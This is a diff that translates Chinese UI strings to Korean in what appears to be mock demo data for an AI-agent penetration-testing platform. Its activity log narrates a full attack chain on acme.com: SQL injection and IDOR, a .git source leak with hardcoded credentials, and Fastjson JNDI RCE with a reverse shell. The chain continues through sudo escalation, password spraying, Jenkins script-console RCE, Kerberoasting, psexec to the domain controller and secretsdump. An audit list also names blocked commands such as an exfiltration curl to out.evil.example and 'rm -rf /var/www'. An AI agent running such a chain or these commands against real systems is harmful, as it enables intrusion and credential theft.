+    detail: "MSSQL 오류 기반 인젝션 징후.",
   },
   {
     seq: 43,
@@ -1872,7 +1872,7 @@ export const activity: Activity[] = [
     tool_use_id: "t42",
     summary:
       "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
-    detail: "确认可注入，枚举出 4 个库。",
+    detail: "인젝션 가능성을 확인하고 데이터베이스 4개를 열거했습니다.",
   },
   {
     seq: 45,
@@ -1892,7 +1892,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t43",
-    summary: "finding f-1 已记录",
+    summary: "finding f-1을 기록했습니다",
   },
   {
     seq: 47,
@@ -1900,7 +1900,7 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-26T01:20:00Z"),
     kind: "result",
-    summary: "SQL 注入确认。",
+    summary: "SQL 인젝션 확인.",
     input_tokens: 118000,
     output_tokens: 7400,
     cache_read_tokens: 82000,
@@ -1914,7 +1914,7 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T02:31:00Z"),
     kind: "thinking",
-    summary: "/v1/orders?id= 是数字自增 id，典型 IDOR 面。先取自己的单，再改 id 看能否读他人。",
+    summary: "/v1/orders?id=는 자동 증가 숫자 ID로 전형적인 IDOR 대상입니다. 먼저 본인 주문을 가져오고 ID를 바꿔 다른 사용자의 주문을 읽을 수 있는지 확인합니다.",
   },
   {
     seq: 51,
@@ -1935,7 +1935,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t51",
     summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
-    detail: "自己的订单，正常。",
+    detail: "본인 주문이며 정상입니다.",
   },
   {
     seq: 53,
@@ -1955,8 +1955,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t52",
-    summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"北京市朝阳区 ****" }',
-    detail: "越权读到他人订单（含手机号/地址），无归属校验。",
+    summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"베이징시 차오양구 ****" }',
+    detail: "다른 사용자의 주문(휴대전화 번호/주소 포함)에 무단 접근했으며 소유자 검사가 없습니다.",
   },
   {
     seq: 55,
@@ -1976,7 +1976,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t53",
-    summary: "finding f-2 已记录",
+    summary: "finding f-2를 기록했습니다",
   },
   {
     seq: 57,
@@ -1984,7 +1984,7 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T03:58:10Z"),
     kind: "thinking",
-    summary: "正在批量遍历 id 范围，评估可越权数据规模（暂不导出，避免触发拦截规则）。",
+    summary: "ID 범위를 일괄 순회하여 무단 접근 가능한 데이터 규모를 평가하는 중입니다(차단 규칙이 발동하지 않도록 아직 내보내지는 않음).",
   },
 
   // work#3 · i3 后台用户接口枚举（running）
@@ -1994,7 +1994,7 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:56:00Z"),
     kind: "thinking",
-    summary: "已有后台会话，枚举管理接口，找能批量导出用户敏感数据的入口（目标②）。",
+    summary: "관리자 세션이 있으므로 관리 인터페이스를 열거하여 민감한 사용자 데이터를 일괄 내보낼 수 있는 진입점을 찾습니다(목표 ②).",
   },
   {
     seq: 61,
@@ -2015,7 +2015,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t61",
     summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
-    detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。",
+    detail: "관리 인터페이스가 모든 사용자(이메일/휴대전화 번호 포함)를 페이지별로 반환하며 약 1만 2800건입니다.",
   },
   {
     seq: 63,
@@ -2023,7 +2023,7 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:58:20Z"),
     kind: "thinking",
-    summary: "确认存在批量用户数据读取入口；导出动作命中破坏性/外泄规则，已提交拦截审批等待放行。",
+    summary: "사용자 데이터를 일괄 읽을 수 있는 진입점을 확인했습니다. 내보내기 동작이 파괴적 동작/유출 규칙과 일치하여 차단 승인을 요청했고 허용을 기다리고 있습니다.",
   },
 
   // workG · ig .git 源码泄露与硬编码凭据（done）
@@ -2033,7 +2033,7 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:26:00Z"),
     kind: "thinking",
-    summary: "robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。",
+    summary: "robots.txt에 /.git이 언급되어 있으므로 먼저 다운로드 가능한지 확인합니다. 소스를 확보하면 화이트박스 방식으로 인젝션 지점과 하드코딩된 키를 찾을 수 있습니다.",
   },
   {
     seq: 311,
@@ -2054,7 +2054,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg1",
     summary: "200",
-    detail: ".git 目录对外可访问。",
+    detail: ".git 디렉터리에 외부에서 접근할 수 있습니다.",
   },
   {
     seq: 313,
@@ -2074,8 +2074,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg2",
-    summary: "还原 214 个文件；HEAD=main。config.php / db.php 在列。",
-    detail: "完整后端源码已还原到 /tmp/acme。",
+    summary: "214개 파일을 복원했습니다. HEAD=main이며 config.php / db.php가 포함됩니다.",
+    detail: "전체 백엔드 소스를 /tmp/acme에 복원했습니다.",
   },
   {
     seq: 315,
@@ -2096,7 +2096,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg3",
     summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
-    detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。",
+    detail: "DB 비밀번호가 하드코딩되어 있고 host가 내부 IP를 가리킵니다. 내부망 공용으로 추정되는 자격 증명으로 기록합니다.",
   },
   {
     seq: 317,
@@ -2104,7 +2104,7 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:36:00Z"),
     kind: "result",
-    summary: "源码泄露 + 硬编码 DB 凭据确认，凭据入图供后续内网复用。",
+    summary: "소스 코드 노출과 하드코딩된 DB 자격 증명을 확인했으며 이후 내부망에서 재사용할 수 있도록 그래프에 기록했습니다.",
     input_tokens: 88000,
     output_tokens: 5200,
     cache_read_tokens: 60000,
@@ -2118,7 +2118,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:22:00Z"),
     kind: "thinking",
-    summary: "shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。",
+    summary: "shop.acme.com은 자체 개발 쇼핑몰입니다. 먼저 프레임워크/구성 요소 버전을 지문으로 식별하고 알려진 역직렬화 취약점이 있는 구성 요소를 조사합니다.",
   },
   {
     seq: 321,
@@ -2139,7 +2139,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
-    detail: "Java 技术栈，存在 /api/import 接受 JSON body。",
+    detail: "Java 기술 스택이며 JSON body를 받는 /api/import가 있습니다.",
   },
   {
     seq: 323,
@@ -2160,8 +2160,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t6b",
-    summary: "报错栈含 com.alibaba.fastjson.JSONException（1.2.24）",
-    detail: "确认 Fastjson 1.2.24 —— 对应 JdbcRowSetImpl JNDI 注入 RCE。",
+    summary: "오류 스택에 com.alibaba.fastjson.JSONException(1.2.24)이 포함됨",
+    detail: "Fastjson 1.2.24를 확인했습니다. JdbcRowSetImpl JNDI 인젝션 RCE에 해당합니다.",
   },
   {
     seq: 325,
@@ -2169,7 +2169,7 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:40:00Z"),
     kind: "result",
-    summary: "指纹命中 Fastjson 1.2.24，反序列化 RCE 面成立，交给利用意图。",
+    summary: "지문이 Fastjson 1.2.24와 일치하여 역직렬화 RCE 표면을 확인했고 악용 검증 의도로 전달합니다.",
     input_tokens: 64000,
     output_tokens: 4100,
     cache_read_tokens: 42000,
@@ -2183,7 +2183,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:12:00Z"),
     kind: "thinking",
-    summary: "起一个 JNDI/LDAP 恶意服务，让 shop 反连加载执行 payload，先 dnslog 验证出网，再落反弹 shell。",
+    summary: "JNDI/LDAP 악성 서비스를 실행하여 shop이 역방향으로 연결하고 페이로드를 불러와 실행하게 합니다. 먼저 dnslog로 외부 연결을 확인한 뒤 리버스 셸을 실행합니다.",
   },
   {
     seq: 331,
@@ -2193,7 +2193,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7a",
-    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务",
+    summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # LDAP/HTTP 악성 서비스 시작",
   },
   {
     seq: 332,
@@ -2204,7 +2204,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7a",
     summary: "LDAP Server started on 1389, HTTP on 8180",
-    detail: "恶意服务就绪。",
+    detail: "악성 서비스가 준비되었습니다.",
   },
   {
     seq: 333,
@@ -2225,8 +2225,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7b",
-    summary: "LDAP 收到请求 → 加载 ReverseShell → nc 监听收到连接",
-    detail: "payload 成功触发。",
+    summary: "LDAP 요청 수신 → ReverseShell 로드 → nc 리스너에 연결 도착",
+    detail: "페이로드 실행에 성공했습니다.",
   },
   {
     seq: 335,
@@ -2236,7 +2236,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7c",
-    summary: "id; hostname -I  # 反弹 shell 内确认身份与网段",
+    summary: "id; hostname -I  # 리버스 셸에서 사용자와 네트워크 대역 확인",
   },
   {
     seq: 336,
@@ -2247,7 +2247,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7c",
     summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
-    detail: "www-data@dmz-web01，且第二网卡 10.10.10.x —— 已进入 DMZ 且贴内网。",
+    detail: "www-data@dmz-web01이며 두 번째 네트워크 인터페이스는 10.10.10.x입니다. DMZ에 진입했으며 내부망과 연결되어 있습니다.",
   },
   {
     seq: 337,
@@ -2265,7 +2265,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:40:00Z"),
     kind: "result",
-    summary: "反序列化 RCE 拿到 www-data 反弹 shell，目标③立足点初步建立。",
+    summary: "역직렬화 RCE로 www-data 리버스 셸을 확보하여 목표 ③의 초기 거점을 마련했습니다.",
     input_tokens: 132000,
     output_tokens: 8600,
     cache_read_tokens: 90000,
@@ -2279,7 +2279,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:02:00Z"),
     kind: "thinking",
-    summary: "www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。",
+    summary: "www-data 권한은 제한적이므로 로컬 정보를 수집하여 sudo 설정, SUID, 커널 버전 등에서 권한 상승 지점을 찾습니다.",
   },
   {
     seq: 341,
@@ -2300,7 +2300,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8a",
     summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
-    detail: "sudo 白名单里 python3 且免密 —— 直接可提权。",
+    detail: "sudo 허용 목록에 python3가 있고 비밀번호가 필요 없어 직접 권한을 상승할 수 있습니다.",
   },
   {
     seq: 343,
@@ -2321,7 +2321,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8b",
     summary: "uid=0(root) gid=0(root) groups=0(root)",
-    detail: "已提权 root。",
+    detail: "root 권한으로 상승했습니다.",
   },
   {
     seq: 345,
@@ -2339,7 +2339,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:20:00Z"),
     kind: "result",
-    summary: "本地提权 root 完成，立足点稳固；准备以其为 pivot 打内网。",
+    summary: "로컬 root 권한 상승을 완료하여 거점을 안정적으로 확보했습니다. 이를 경유하여 내부망으로 진행할 준비를 합니다.",
     input_tokens: 74000,
     output_tokens: 4700,
     cache_read_tokens: 50000,
@@ -2353,7 +2353,7 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T20:32:00Z"),
     kind: "thinking",
-    summary: "立足点直连 10.10.10.0/24，用 fscan/内网扫描做主机与端口发现，圈定域控与高价值主机。",
+    summary: "거점이 10.10.10.0/24에 직접 연결되어 있으므로 fscan/내부망 스캔으로 호스트와 포트를 찾고 도메인 컨트롤러 및 중요 호스트를 식별합니다.",
   },
   {
     seq: 351,
@@ -2374,7 +2374,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t9a",
     summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
-    detail: "圈定域控 DC01、文件服务器 FS01、内部 Jenkins。",
+    detail: "도메인 컨트롤러 DC01, 파일 서버 FS01 및 내부 Jenkins를 식별했습니다.",
   },
   {
     seq: 353,
@@ -2382,7 +2382,7 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T21:00:00Z"),
     kind: "result",
-    summary: "内网主机发现完成，3 台高价值目标入图。",
+    summary: "내부망 호스트 탐색을 완료하고 중요 대상 3개를 그래프에 기록했습니다.",
     input_tokens: 82000,
     output_tokens: 5100,
     cache_read_tokens: 56000,
@@ -2396,7 +2396,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:42:00Z"),
     kind: "thinking",
-    summary: "源码泄露的 sa/Acme@2021 是 DB 口令，企业常见口令复用。对 DC01/FS01/JENKINS 做密码喷洒。",
+    summary: "소스에서 노출된 sa/Acme@2021은 DB 비밀번호이며 기업에서 비밀번호 재사용은 흔합니다. DC01/FS01/JENKINS에 비밀번호 스프레이를 수행합니다.",
   },
   {
     seq: 361,
@@ -2416,8 +2416,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t10a",
-    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 认证失败",
-    detail: "FS01 上 sa 口令复用成功且有管理员权限；DC01 不通。",
+    summary: "FS01 [+] acme.local\\sa:Acme@2021 (Pwn3d!)\nDC01 [-] 인증 실패",
+    detail: "FS01에서 sa 비밀번호 재사용에 성공했으며 관리자 권한이 있습니다. DC01에서는 실패했습니다.",
   },
   {
     seq: 363,
@@ -2425,7 +2425,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:50:00Z"),
     kind: "thinking",
-    summary: "FS01 已拿下，正在枚举共享目录寻找更多凭据和敏感文件……",
+    summary: "FS01을 확보했으며 공유 디렉터리를 열거하여 추가 자격 증명과 민감한 파일을 찾고 있습니다…",
   },
 
   // work#11 · i11 Jenkins 未授权 RCE（done）
@@ -2435,7 +2435,7 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:32:00Z"),
     kind: "thinking",
-    summary: "JENKINS 8080 直接可访问，先看 /script 控制台是否需要认证。",
+    summary: "JENKINS 8080에 직접 접근할 수 있습니다. 먼저 /script 콘솔에 인증이 필요한지 확인합니다.",
   },
   {
     seq: 371,
@@ -2456,7 +2456,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11a",
     summary: "200",
-    detail: "Script Console 无需登录即可访问。",
+    detail: "로그인 없이 Script Console에 접근할 수 있습니다.",
   },
   {
     seq: 373,
@@ -2477,7 +2477,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11b",
     summary: "nt authority\\system",
-    detail: "Groovy 以 SYSTEM 权限执行。",
+    detail: "Groovy가 SYSTEM 권한으로 실행됩니다.",
   },
   {
     seq: 375,
@@ -2487,7 +2487,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11c",
-    summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # 导出 Jenkins 凭据库",
+    summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText  # Jenkins 자격 증명 저장소 추출",
   },
   {
     seq: 376,
@@ -2498,7 +2498,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11c",
     summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
-    detail: "两个域服务账号明文口令导出。",
+    detail: "도메인 서비스 계정 두 개의 평문 비밀번호를 추출했습니다.",
   },
   {
     seq: 377,
@@ -2516,7 +2516,7 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:50:00Z"),
     kind: "result",
-    summary: "Jenkins 未授权 RCE 确认，并导出两个域服务账号凭据。",
+    summary: "Jenkins 인증 없는 RCE를 확인하고 도메인 서비스 계정 두 개의 자격 증명을 추출했습니다.",
     input_tokens: 96000,
     output_tokens: 6200,
     cache_read_tokens: 64000,
@@ -2530,7 +2530,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T22:42:00Z"),
     kind: "thinking",
-    summary: "用 svc_deploy 凭据做域认证，然后 GetUserSPNs 请求可 Kerberoast 的服务账号 TGS。",
+    summary: "svc_deploy 자격 증명으로 도메인 인증을 수행한 뒤 GetUserSPNs로 Kerberoasting 가능한 서비스 계정의 TGS를 요청합니다.",
   },
   {
     seq: 381,
@@ -2551,7 +2551,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12a",
     summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
-    detail: "拿到 svc_sql 的 TGS 票据（Kerberos RC4）。",
+    detail: "svc_sql의 TGS 티켓(Kerberos RC4)을 확보했습니다.",
   },
   {
     seq: 383,
@@ -2572,7 +2572,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12b",
     summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
-    detail: "8 分钟破出口令 Sql@2020。",
+    detail: "8분 만에 비밀번호 Sql@2020을 해독했습니다.",
   },
   {
     seq: 385,
@@ -2590,7 +2590,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T23:20:00Z"),
     kind: "result",
-    summary: "Kerberoasting 破出 svc_sql 口令，入图供域控攻击使用。",
+    summary: "Kerberoasting으로 svc_sql의 비밀번호를 해독하고 도메인 컨트롤러 공격에 사용할 수 있도록 그래프에 기록했습니다.",
     input_tokens: 108000,
     output_tokens: 6800,
     cache_read_tokens: 72000,
@@ -2604,7 +2604,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-25T23:52:00Z"),
     kind: "thinking",
-    summary: "svc_deploy 来自 Jenkins 凭据库，先查组成员资格——若属于 Domain Admins 就可直接 psexec DC01。",
+    summary: "svc_deploy는 Jenkins 자격 증명 저장소에서 가져왔습니다. 먼저 그룹 소속을 확인합니다. Domain Admins에 속하면 DC01에 바로 psexec를 사용할 수 있습니다.",
   },
   {
     seq: 391,
@@ -2625,7 +2625,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13a",
     summary: "ACME\\Administrator\nACME\\svc_deploy",
-    detail: "svc_deploy 是 Domain Admins 成员。",
+    detail: "svc_deploy는 Domain Admins 구성원입니다.",
   },
   {
     seq: 393,
@@ -2646,7 +2646,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13b",
     summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
-    detail: "以 SYSTEM 身份登录域控 DC01。",
+    detail: "SYSTEM으로 도메인 컨트롤러 DC01에 로그인했습니다.",
   },
   {
     seq: 395,
@@ -2667,7 +2667,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13c",
     summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
-    detail: "全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。",
+    detail: "전체 도메인 NTLM 해시(krbtgt 포함)를 추출하여 골든 티켓을 통한 지속적 제어가 가능합니다.",
   },
   {
     seq: 397,
@@ -2685,7 +2685,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-26T00:20:00Z"),
     kind: "result",
-    summary: "域控 DC01 拿下，secretsdump 导出全域哈希，靶标达成。",
+    summary: "도메인 컨트롤러 DC01을 확보하고 secretsdump로 전체 도메인 해시를 추출하여 테스트 목표를 달성했습니다.",
     input_tokens: 144000,
     output_tokens: 9200,
     cache_read_tokens: 96000,
@@ -2693,30 +2693,30 @@ export const activity: Activity[] = [
   },
 
   // 主 agent（人在环路对话）
-  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
+  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "관리자 시스템은 어디부터 접근할까요?" },
   {
     seq: 71,
     worker: "mainagent",
     ts: T("2026-07-26T03:18:06Z"),
     kind: "text",
     summary:
-      "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。",
+      "admin.acme.com은 Element-UI 관리자 시스템이며 CAPTCHA와 요청 속도 제한이 없습니다. 기본 비밀번호 목록(admin/admin123)을 먼저 시도한 뒤 사전을 사용하는 것이 좋습니다. 워커 에이전트에 높은 우선순위의 의도를 삽입했습니다.",
   },
-  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
+  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "관리자 권한을 얻었는데 다음에는 무엇에 집중할까요?" },
   {
     seq: 73,
     worker: "mainagent",
     ts: T("2026-07-26T03:52:08Z"),
     kind: "text",
     summary:
-      "目标②是读用户敏感数据：并行推进「后台用户接口枚举」与「API IDOR」。注意批量导出会触发拦截规则，需要你审批放行。",
+      "목표 ②는 사용자의 민감한 데이터를 읽는 것입니다. 「관리자 사용자 인터페이스 열거」와 「API IDOR」를 병렬로 진행합니다. 일괄 내보내기는 차단 규칙을 발동시키므로 직접 승인해야 합니다.",
   },
   {
     seq: 400,
     worker: "mainagent",
     ts: T("2026-07-25T15:42:00Z"),
     kind: "user",
-    summary: "shell 拿到了，下一步怎么打？",
+    summary: "셸을 확보했는데 다음 단계는 무엇인가요?",
   },
   {
     seq: 401,
@@ -2724,14 +2724,14 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T15:42:10Z"),
     kind: "text",
     summary:
-      "www-data 权限不够，先提权（sudo -l 看起来有戏）。拿到 root 后以 DMZ 为跳板做内网发现，优先域控和 Jenkins。",
+      "www-data 권한은 부족하므로 먼저 권한을 상승합니다(sudo -l에서 가능성이 보입니다). root를 확보한 뒤 DMZ를 경유하여 내부망을 탐색하고 도메인 컨트롤러와 Jenkins를 우선합니다.",
   },
   {
     seq: 402,
     worker: "mainagent",
     ts: T("2026-07-25T21:22:00Z"),
     kind: "user",
-    summary: "内网扫完了，Jenkins 那台看起来有未授权？",
+    summary: "내부망 스캔이 끝났는데 Jenkins에 인증이 없는 것 같나요?",
   },
   {
     seq: 403,
@@ -2739,16 +2739,16 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T21:22:08Z"),
     kind: "text",
     summary:
-      "对，/script 无鉴权直接 Groovy RCE。我已注入一条提示让 worker 优先打 Jenkins —— 拿下后可以导出域凭据，再配合 Kerberoasting 打域控。",
+      "맞습니다. /script에 인증이 없어 직접 Groovy RCE가 가능합니다. 워커가 Jenkins를 우선하도록 힌트를 삽입했습니다. 확보 후 도메인 자격 증명을 추출하고 Kerberoasting과 결합하여 도메인 컨트롤러로 진행할 수 있습니다.",
   },
-  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 拿下了？给个总结。" },
+  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01을 확보했나요? 요약해 주세요." },
   {
     seq: 405,
     worker: "mainagent",
     ts: T("2026-07-26T00:22:12Z"),
     kind: "text",
     summary:
-      "确认拿下。攻击路径：shop Fastjson RCE → DMZ 提权 → 内网 Jenkins 导出域凭据 → svc_deploy 属 Domain Admins → psexec DC01 SYSTEM → secretsdump 全域哈希。四个目标全部达成或推进中。",
+      "확보를 확인했습니다. 공격 경로: shop Fastjson RCE → DMZ 권한 상승 → 내부 Jenkins에서 도메인 자격 증명 추출 → svc_deploy의 Domain Admins 소속 확인 → psexec DC01 SYSTEM → secretsdump로 전체 도메인 해시 추출. 네 목표 모두 달성했거나 진행 중입니다.",
   },
 ];
 
@@ -2921,7 +2921,7 @@ Content-Length: 655
   "order_id": 1002,
   "user_id": 77,
   "amount": 1299.00,
-  "address": "北京市朝阳区 ****",
+  "address": "베이징시 차오양구 ****",
   "phone": "138****6021",
   "items": [{ "sku": "A-100", "qty": 1 }]
 }`,
@@ -2947,7 +2947,7 @@ export const audit: Audit = {
       ts: T("2026-07-26T02:10:00Z"),
       tool: "bash",
       action: "block",
-      reason: "目标越界：out.evil.example 不在 scope 内",
+      reason: "대상 범위 이탈: out.evil.example은 scope에 포함되지 않음",
       command: "curl https://out.evil.example/exfil",
     },
     {
@@ -2960,7 +2960,7 @@ export const audit: Audit = {
       ts: T("2026-07-25T21:00:00Z"),
       tool: "bash",
       action: "block",
-      reason: "破坏性命令门控：rm -rf 被拒绝",
+      reason: "파괴적 명령 승인 제어: rm -rf 거부됨",
       command: "rm -rf /var/www",
     },
     {
@@ -2992,14 +2992,14 @@ export const audit: Audit = {
       ts: T("2026-07-26T00:05:00Z"),
       tool: "bash",
       action: "block",
-      reason: "数据外泄门控：secretsdump 需人工审批",
+      reason: "데이터 유출 승인 제어: secretsdump는 수동 승인 필요",
       command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
     },
     {
       ts: T("2026-07-26T00:06:00Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行",
+      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 승인 후 허용됨",
     },
   ],
 };
@@ -3068,7 +3068,7 @@ export const agents: Agent[] = [
     role: "assistant",
     builtin: false,
     enabled: true,
-    description: "从漏洞详情手动启动，保存独立复测结论",
+    description: "취약점 상세 정보에서 수동으로 시작하고 독립적인 재검증 결론 저장",
     max_turns: 0,
     mcp_count: 0,
     skill_count: 0,
@@ -3077,11 +3077,11 @@ export const agents: Agent[] = [
   {
     id: "1",
     key: "goals",
-    name: "目标拆解器",
+    name: "목표 분해기",
     role: "goals",
     builtin: true,
     enabled: true,
-    description: "把任务目标拆成可探索的子目标",
+    description: "작업 목표를 탐색 가능한 하위 목표로 분해",
     max_turns: 8,
     mcp_count: 0,
     skill_count: 1,
@@ -3090,11 +3090,11 @@ export const agents: Agent[] = [
   {
     id: "2",
     key: "planner",
-    name: "规划者",
+    name: "계획자",
     role: "planner",
     builtin: true,
     enabled: true,
-    description: "读探索路线、判断目标达成、生成意图",
+    description: "탐색 경로를 읽고 목표 달성 여부를 판정하며 의도 생성",
     max_turns: 0,
     mcp_count: 1,
     skill_count: 2,
@@ -3103,11 +3103,11 @@ export const agents: Agent[] = [
   {
     id: "3",
     key: "mainagent",
-    name: "主 Agent",
+    name: "주 에이전트",
     role: "mainagent",
     builtin: true,
     enabled: true,
-    description: "人在环路对话，注入 hint / 高优意图",
+    description: "사람이 참여하는 대화, 힌트 / 높은 우선순위 의도 삽입",
     max_turns: 0,
     web_search: true,
     mcp_count: 2,
@@ -3117,11 +3117,11 @@ export const agents: Agent[] = [
   {
     id: "4",
     key: "worker",
-    name: "Work Agent",
+    name: "워커 에이전트",
     role: "worker",
     builtin: true,
     enabled: true,
-    description: "claim 意图 → 跑 Kali 工具 → 图写回",
+    description: "의도 할당 → Kali 도구 실행 → 그래프에 기록",
     max_turns: 40,
     run_seconds: 1800,
     web_search: false,
@@ -3133,11 +3133,11 @@ export const agents: Agent[] = [
   {
     id: "5",
     key: "recon-bot",
-    name: "侦察机器人（自定义）",
+    name: "정찰 봇(사용자 지정)",
     role: "custom",
     builtin: false,
     enabled: true,
-    description: "定时对新资产做被动侦察",
+    description: "새 자산에 주기적으로 수동적 정찰 수행",
     max_turns: 12,
     mcp_count: 1,
     skill_count: 1,
@@ -3146,30 +3146,30 @@ export const agents: Agent[] = [
 ];
 
 const promptVars: PromptVar[] = [
-  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
-  { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
-  { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
+  { name: "Goal", description: "현재 작업 목표", example: "acme.com 관리자 권한 확보", source: "runtime" },
+  { name: "AssetSummary", description: "자산 그래프 개요", example: "하위 도메인 6 / IP 3 / 앱 4 / 엔드포인트 4", source: "distilled" },
+  { name: "RouteHint", description: "탐색 경로 힌트", example: "관리자 시스템 및 API 권한 우회 표면 우선", source: "exploration" },
 ];
 
 const promptVersions: PromptVersion[] = [
